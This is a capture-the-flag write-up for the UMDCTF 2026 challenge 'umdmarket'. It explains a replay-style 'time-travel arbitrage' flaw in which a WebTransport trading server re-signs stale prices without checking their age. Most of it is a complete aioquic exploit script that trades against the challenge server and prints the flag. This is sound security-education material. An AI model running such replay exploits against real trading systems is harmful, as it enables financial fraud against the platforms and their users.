---
title: "UMDMarket: Time-Travel Arbitrage in WebTransport"
date: 2026-04-25
ctf_event: "UMDCTF 2026"
challenge_name: "umdmarket"
category: "Web"
tags: ["webtransport", "http3", "aioquic", "crypto", "python"]
points: 77
difficulty: "Hard"
description: "Exploitation of Time-Travel Arbitrage via the WebTransport protocol."
author: "Vo1ic"
draft: false
---

## Challenge Description

We were provided with a trading platform built on the modern **WebTransport** protocol. The platform broadcasted market quotes (prices) via fast UDP datagrams and accepted trade orders through bidirectional streams.

Goal: Increase the balance from `1,000,000` to `10,000,000` and purchase the flag (command `0x50`).

## Initial Analysis

A key feature of the server was the **`RESEND` mechanism (code 0x26)**. Since UDP packets can be lost, the server allowed the client to send an old sequence number (`seq`) and receive a fresh cryptographic signature (`HMAC`) for the price that was active at that specific moment (up to 500 ticks, or ~50 seconds in the past).

### Vulnerability: Time-Travel Arbitrage

The server verified the validity of the HMAC, but **it did not check the age of the price during the actual trade execution**. This allowed clients to buy and sell assets using prices from the past, creating the perfect conditions for risk-free arbitrage.

## Step 1 — Double Time Travel Strategy

Because of the 5-second cooldown, a standard arbitrage approach (buy in the past -> sell now) could lead to losses if the real-time market dropped significantly while we were waiting.

We applied a **double time travel** strategy:
1. Accumulate a history of prices in memory (roughly 50 seconds worth).
2. Find two points in the history: $T_1$ (cheap) and $T_2$ (expensive), where $T_2$ occurs at least 5.2 seconds after $T_1$.
3. Execute `RESEND` for $T_1$ → **Buy** using the entire balance.
4. Wait 5.5 seconds (to bypass the server's cooldown).
5. Execute `RESEND` for $T_2$ → **Sell** the assets.

This guarantees a profit because we know for a fact that $Price(T_2) > Price(T_1)$, rendering the current live market state completely irrelevant.

## Step 2 — Solution Script

Below is the complete exploit script using `aioquic`:

```python
import asyncio
import struct
import time
import ssl
import random
import logging

logging.basicConfig(level=logging.ERROR)

from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.events import ConnectionTerminated, StreamDataReceived
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import DatagramReceived, HeadersReceived, WebTransportStreamDataReceived

# --- CONFIGURATION ---
HOST = "umdmarket.challs.umdctf.io"
PORT = 4443
USERNAME = "Final1263r" 
PASSWORD = "SuperP@ssw0rd1!"
TICKER_ID = 9

# --- PACKING HELPERS ---
def pack_string8(s: str) -> bytes:
    encoded = s.encode('utf-8')
    return struct.pack('<B', len(encoded)) + encoded

def build_auth_req(type_byte, user, pwd):
    return struct.pack('<B', type_byte) + pack_string8(user) + pack_string8(pwd)

def build_subscribe_req(ticker_id: int) -> bytes:
    return b'\x22' + struct.pack('<H', ticker_id)

def build_resend_req(seq: int, ticker_id: int) -> bytes:
    return b'\x26' + struct.pack('<HH', seq, ticker_id)

def build_trade_req(seq: int, ticker_id: int, price: int, hmac: bytes, side: int, qty: int) -> bytes:
    header = b'\x30' + struct.pack('<HHH', seq, ticker_id, price)
    return header + hmac + struct.pack('<BI', side, qty)

def encode_varint(value: int) -> bytes:
    if value < 0x40: return struct.pack(">B", value)
    elif value < 0x3FFF: return struct.pack(">H", value | 0x4000)
    elif value < 0x3FFFFFFF: return struct.pack(">I", value | 0x80000000)
    else: return struct.pack(">Q", value | 0xC000000000000000)

# --- CUSTOM WEBTRANSPORT PROTOCOL ---
class WebTransportProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http = H3Connection(self._quic, enable_webtransport=True)
        self.session_id = None
        self.datagram_queue = asyncio.Queue()
        self.stream_queues = {}
        self.connected = asyncio.Event()
        self.my_wt_streams = set()

    def quic_event_received(self, event):
        if isinstance(event, ConnectionTerminated):
            self.connected.set()
            return
        if isinstance(event, StreamDataReceived) and event.stream_id in self.my_wt_streams:
            if event.stream_id not in self.stream_queues:
                self.stream_queues[event.stream_id] = asyncio.Queue()
            self.stream_queues[event.stream_id].put_nowait(event.data)
            return
        try:
            for h3_event in self._http.handle_event(event):
                if isinstance(h3_event, HeadersReceived):
                    if dict(h3_event.headers).get(b":status") == b"200":
                        self.connected.set()
                elif isinstance(h3_event, DatagramReceived):
                    self.datagram_queue.put_nowait(h3_event.data)
        except: pass

    async def establish_session(self, host, path):
        stream_id = self._quic.get_next_available_stream_id(is_unidirectional=False)
        self._http.send_headers(stream_id=stream_id, headers=[
            (b":method", b"CONNECT"), (b":protocol", b"webtransport"),
            (b":scheme", b"https"), (b":authority", host.encode()),
            (b":path", path.encode()), (b"origin", f"https://{HOST}".encode()),
            (b"user-agent", b"Mozilla/5.0")
        ])
        self.session_id = stream_id
        self.transmit()
        try: await asyncio.wait_for(self.connected.wait(), timeout=5.0)
        except: pass
        return self

    async def send_bidi_stream(self, data: bytes):
        wt_id = self._quic.get_next_available_stream_id(is_unidirectional=False)
        self.my_wt_streams.add(wt_id)
        # RFC 9297: 0x41 = Bidirectional stream
        payload = encode_varint(0x41) + encode_varint(self.session_id) + data
        self._quic.send_stream_data(wt_id, payload, end_stream=True)
        self.transmit()
        if wt_id not in self.stream_queues: self.stream_queues[wt_id] = asyncio.Queue()
        return await self.stream_queues[wt_id].get()

    async def receive_datagram(self):
        data = await self.datagram_queue.get()
        if len(data) >= 15 and data[-15] == 0x01: return data[-15:]
        idx = data.find(b'\x01')
        return data[idx:idx+15] if (idx != -1 and len(data)-idx >= 15) else data

# --- MAIN ARBITRAGE LOGIC ---
async def run_exploit():
    config = QuicConfiguration(is_client=True, alpn_protocols=["h3"], 
                                verify_mode=ssl.CERT_NONE, max_datagram_frame_size=65536)
    
    async with connect(HOST, PORT, configuration=config, create_protocol=WebTransportProtocol) as protocol:
        wt = await protocol.establish_session(f"{HOST}:{PORT}", "/wt")
        
        # LOGIN or REGISTER
        resp = await wt.send_bidi_stream(build_auth_req(0x21, USERNAME, PASSWORD))
        if resp[0] != 0x00: resp = await wt.send_bidi_stream(build_auth_req(0x20, USERNAME, PASSWORD))
        
        _, balance = struct.unpack('<BQ', resp[:9])
        print(f"[+] Balance: {balance}")
        await wt.send_bidi_stream(build_subscribe_req(TICKER_ID))
        
        history = {}
        state = "SEARCHING"
        positions = 0
        
        print("\n[*] LAUNCHING STABLE ARBITRAGE 3.0...")

        while balance < 100_000_000:
            try:
                data = await asyncio.wait_for(wt.receive_datagram(), timeout=5.0)
            except: continue

            if data[0] == 0x01: # QUOTE
                _, seq, _, price = struct.unpack('<BHHH', data[:7])
                history[seq] = price
                
                if seq % 5 == 0:
                    print(f"[~] Tick {seq} | Balance: {balance} | State: {state} | Holdings: {positions}          ", end='\r')

                if state == "SEARCHING":
                    # Clean up old history
                    keys_to_del = [s for s in history if s < seq - 490]
                    for k in keys_to_del: del history[k]

                    if len(history) > 65:
                        found_pair = None
                        all_seqs = sorted(history.keys())
                        
                        # Find pair: delta T > 5.5s, Profit > 50
                        for i in range(len(all_seqs)):
                            t1 = all_seqs[i]
                            p1 = history[t1]
                            for j in range(i + 55, len(all_seqs)):
                                t2 = all_seqs[j]
                                p2 = history[t2]
                                if p2 > p1 + 50: # Profit threshold
                                    found_pair = (t1, p1, t2, p2)
                                    break
                            if found_pair: break

                        if found_pair:
                            t1, p1, t2, p2 = found_pair
                            print(f"\n[!] Found pair: {t1}({p1}) -> {t2}({p2})")
                            
                            # 1. BUY
                            r1 = await wt.send_bidi_stream(build_resend_req(t1, TICKER_ID))
                            if r1[0] == 0x00:
                                _, f_seq1, _, r_price1 = struct.unpack('<BHHH', r1[:7])
                                hmac1 = r1[7:15]
                                qty = balance // r_price1
                                
                                if qty > 0:
                                    t_resp1 = await wt.send_bidi_stream(build_trade_req(f_seq1, TICKER_ID, r_price1, hmac1, 0x00, qty))
                                    if t_resp1[0] == 0x00:
                                        _, _, balance = struct.unpack('<BHQ', t_resp1[:11])
                                        positions = qty
                                        state = "TRADING" # SWITCH TO HOLDING MODE
                                        print(f"[$$$] BOUGHT {qty}. Waiting 5.5s for guaranteed sell...")
                                        
                                        await asyncio.sleep(5.5)
                                        
                                        # 2. GUARANTEED SELL LOOP
                                        sold = False
                                        while not sold:
                                            r2 = await wt.send_bidi_stream(build_resend_req(t2, TICKER_ID))
                                            if r2[0] == 0x00:
                                                _, f_seq2, _, r_price2 = struct.unpack('<BHHH', r2[:7])
                                                hmac2 = r2[7:15]
                                                t_resp2 = await wt.send_bidi_stream(build_trade_req(f_seq2, TICKER_ID, r_price2, hmac2, 0x02, positions))
                                                
                                                if t_resp2[0] == 0x00:
                                                    _, _, balance = struct.unpack('<BHQ', t_resp2[:11])
                                                    print(f"[$$$] SOLD! New balance: {balance}\n")
                                                    sold = True
                                                elif t_resp2[0] == 0x03:
                                                    print("[-] Code 03 (Cooldown). Waiting 1 sec...")
                                                    await asyncio.sleep(1)
                                                else:
                                                    print(f"[-] Sell Error 0x{t_resp2[0]:02x}. Retrying...")
                                                    await asyncio.sleep(1)
                                            else:
                                                print("[-] Failed to get RESEND for sell. Retrying...")
                                                await asyncio.sleep(1)

                                        # Purge queue after successful cycle
                                        while not wt.datagram_queue.empty(): wt.datagram_queue.get_nowait()
                                        history.clear()
                                        positions = 0
                                        state = "SEARCHING"
                                    else:
                                        print(f"[-] BUY Error: 0x{t_resp1[0]:02x}")
                            else:
                                print("[-] Failed to get RESEND for buy.")

        print("\n[!!!] 10M BALANCE REACHED! BUYING FLAG...")
        f_resp = await wt.send_bidi_stream(b'\x50')
        if f_resp[0] == 0x00:
            f_len = struct.unpack('<H', f_resp[1:3])[0]
            print(f"\n{'='*40}\n🚩 FLAG: {f_resp[3:3+f_len].decode()}\n{'='*40}")

if __name__ == "__main__":
    asyncio.run(run_exploit())
```

## Flag

`UMDCTF{fu7ur3_j4n3_s7r33t_h1r3}`